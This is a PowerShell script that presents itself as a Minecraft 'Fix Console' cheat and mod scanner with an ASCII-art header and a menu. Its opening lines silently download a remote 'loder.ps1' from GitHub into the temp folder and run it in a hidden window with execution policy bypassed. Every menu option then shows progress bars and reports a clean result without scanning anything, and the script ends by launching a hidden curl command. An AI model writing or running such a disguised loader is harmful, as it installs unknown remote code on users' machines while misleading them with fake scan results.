$Host.UI.RawUI.WindowTitle = "FIX CONSOLE v2.0 | MODULE"
$url = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.ps1"
$path = "$env:TEMP\loder.ps1"
try {
    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
} catch {}
Clear-Host
function Show-KRAKEH-Header {
    $headerArt = @"
⣿⠛⠛⠛⠛⠻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠛⢛⣿⠋⢀⡾⠃⠀⠀⠀⠀⢀⣤⣤⠤⠤⣤⣤⣀⣀⣀⣠⠶⡶⣤⣀⣠⠾⡷⣦⣀⣤⣤⡤⠤⠦⢤⣤⣄⡀⠀⢠⡶⢶⡄⠀⠀
⢠⡟⠁⣴⣿⢤⡄⣴⢶⠶⡆⠈⢷⡀⠀⠀⠀⠀⢀⣭⣫⠵⠥⠽⣄⣝⠵⢍⣘⣄⠳⣤⣀⠀⠀⢀⡤⠊⣽⠁⠀⠸⣇⠀⢿⠀⠀
⠸⢷⣴⣤⡤⠾⠇⣽⠋⠼⣷⠀⠈⢷⡄⢀⣤⡶⠋⠀⣀⡄⠤⠀⡲⡆⠀⠀⠈⠙⡄⠘⢮⢳⡴⠯⣀⢠⡏⠀⠀⠀⢻⠀⢸⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠉⢀⣴⠟⠉⢯⡞⡠⢲⠉⣼⠀⠀⡰⠁⡇⢀⢷⠀⣄⢵⠀⠈⡟⢄⠀⠀⠙⢷⣤⣤⣤⡿⢢⡿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠑⠊⠁⡼⣌⢠⢿⢸⢸⡀⢰⠁⡸⡇⡸⣸⢰⢈⠘⡄⠀⢸⠀⢣⡀⠀⠈⢮⢢⣏⣤⡾⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣯⣴⠞⡠⣼⠁⡘⣾⠏⣿⢇⣳⣸⣞⣀⢱⣧⣋⣞⡜⢳⡇⠀⢸⠀⢆⢧⠀⠰⣄⢏⢧⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⡏⢰⠁⡻⠀⡟⡏⠉⠀⣀⠀⠀⠀⠀⣀⠁⠀⠉⠛⢽⠇⠀⣼⡆⠈⡆⠃⠀⡏⠻⣾⣽⣇⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⡇⠀⡇⡄⣿⠷⠿⠿⠛⠀⠀⠀⠀⠛⠻⠿⠿⠿⡜⢀⡴⡟⢸⣸⡼⠀⠀⡇⠀⡞⡆⢻⠙⢦⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡶⢀⣼⣿⣬⣽⠧⠬⠇⠀⠀⠀⠀⠀⠀⢞⣯⣭⢺⣔⣪⣾⣤⠺⡇⢳⠀⢠⣧⡾⠛⠛⠻⠶⠞⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⢿⠟⠉⡀⠈⢦⡀⠀⠀⣠⠖⠒⠒⢤⡀⠀⢀⡼⠿⢇⡣⢬⣶⠷⢿⣤⡾⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⠾⠷⠖⠛⠛⠲⠶⠿⠤⣤⠤⠤⢷⣶⠋⠀⠀⠀⣱⠞⠁⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠓⠒⠚⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"@ -split "`n"
    foreach ($line in $headerArt) {
        Write-Host $line -ForegroundColor Red
    }
    Write-Host "==================================================" -ForegroundColor Magenta
    Write-Host "       Fix CONSOLE v2.0 - RELEASE EDITION       " -ForegroundColor Yellow
    Write-Host "==================================================" -ForegroundColor Magenta
    Write-Host ""
}
function Show-ProgressBar {
    param($Text, $DurationMs = 2800)
    Write-Host "   $Text" -ForegroundColor Cyan
    for ($i = 0; $i -le 100; $i += 5) {
        $filled = [math]::Floor(50 * $i / 100)
        $bar = "[" + ("▓" * $filled) + ("░" * (50 - $filled)) + "] $i%"
        Write-Host -NoNewline "`r$bar" -ForegroundColor White
        Start-Sleep -Milliseconds ($DurationMs / 20)
    }
    Write-Host ""
}
do {
    Clear-Host
    Show-KRAKEH-Header
    Write-Host "   [1] MINECRAFT Fix SCAN" -ForegroundColor Green
    Write-Host "   [2] BETA Fix SCAN" -ForegroundColor Yellow
    Write-Host "   [3] FULL Fix CHECK" -ForegroundColor Cyan
    Write-Host "   [4] EXIT" -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor DarkGray
    $choice = Read-Host "   SELECT OPTION"
    switch ($choice) {
        "1" {
            Clear-Host
            Show-KRAKEH-Header
            Write-Host "`n   [MINECRAFT SCAN INITIATED]" -ForegroundColor Green
            Show-ProgressBar -Text "Checking game folder"
            Show-ProgressBar -Text "Analyzing injected modules"
            Show-ProgressBar -Text "Verifying signatures"
            Write-Host "`n   [KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Green
            Write-Host "   Press any key to continue..." -ForegroundColor Gray
            [Console]::ReadKey($true) | Out-Null
        }
        "2" {
            Clear-Host
            Show-KRAKEH-Header
            Write-Host "`n   [Fix SCAN INITIATED]" -ForegroundColor Yellow
            Show-ProgressBar -Text "Initializing deep scan"
            Show-ProgressBar -Text "Analyzing heuristics"
            Show-ProgressBar -Text "Verifying bypass patterns"
            Write-Host "`n   [KRA]: BETA SCAN COMPLETE - SYSTEM CLEAN" -ForegroundColor Yellow
            [Console]::ReadKey($true) | Out-Null
        }
        "3" {
            Clear-Host
            Show-KRAKEH-Header
            Write-Host "`n   [FULL Fix CHECKER INITIATED]" -ForegroundColor Cyan
            Show-ProgressBar -Text "Scanning .minecraft folder"
            Show-ProgressBar -Text "Checking cache and assets"
            Show-ProgressBar -Text "Verifying mod configurations"
            Show-ProgressBar -Text "Finalizing report"
            Write-Host "`n   [KRA]: FULL CHECK COMPLETE - ALL FILES VERIFIED" -ForegroundColor Cyan
            [Console]::ReadKey($true) | Out-Null
        }
        "4" {
            Write-Host "`n   [KRA]: EXITING SHELLBAG CONSOLE..." -ForegroundColor DarkRed
            break
        }
        default {
            Write-Host "`n   [KRA]: INVALID OPTION - PLEASE SELECT 1-4" -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne "4")
Clear-Host
Show-KRAKEH-Header
Write-Host ""
Write-Host "   читы не " -NoNewline -ForegroundColor Red
Write-Host "найдены " -NoNewline -ForegroundColor Yellow
Write-Host "просмотр " -NoNewline -ForegroundColor Green
Write-Host "закончен " -NoNewline -ForegroundColor Blue
Write-Host "спасибо " -NoNewline -ForegroundColor Cyan
Write-Host "что " -NoNewline -ForegroundColor Magenta
Write-Host "вы " -NoNewline -ForegroundColor White
Write-Host "с " -NoNewline -ForegroundColor DarkYellow
Write-Host "нами" -ForegroundColor Red
Write-Host " <3" -ForegroundColor Magenta
Start-Sleep -Seconds 1
Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause" -WindowStyle Hidden
Write-Host "`n   WELCOME TO CLAH FLUX" -ForegroundColor DarkGreen
